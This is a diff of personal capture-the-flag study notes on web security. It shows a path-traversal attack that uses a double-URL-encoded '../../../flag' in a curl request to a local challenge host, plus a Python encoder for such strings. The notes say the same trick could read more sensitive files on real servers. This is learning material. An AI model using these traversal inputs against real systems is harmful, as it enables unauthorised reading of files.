@@ -88,14 +88,17 @@ $(< "$FILE")
 
 ; ===============  Web Security
 
-; ===============    GET URL injection
+; ===    GET URL injection
+; Here I tricked the server to read /flag (file on the actual OS) through the server
+; in reality, I will trick the server to let it do/read other stuff
+; stuff more sensitive, the developer didn't through/handle my tricky input.
 ;
 ; When its GET request I like to use google!
 ; to convet string for GET URL; ex: "../../../flag"
 ; https://www.google.com/search?q=..%2F..%2F..%2Fflag
 $ curl -v curl -v http://challenge.localhost:80/..%252F..%252F..%252Fflag
 
-; ===  WITH Python:
+; WITH Python:
 ;
 ; url-encode string for a GET path; like Google URLs
 from urllib.parse import quote
@@ -106,3 +109,5 @@ def urlenc(s: str) -> str:
       return "%" + s.encode().hex("%")
 
 print(urlenc("../../../flag"))     # %2e%2e%2f%2e%2e%2f%2e%2e%2f%66%6c%61%67
+
+
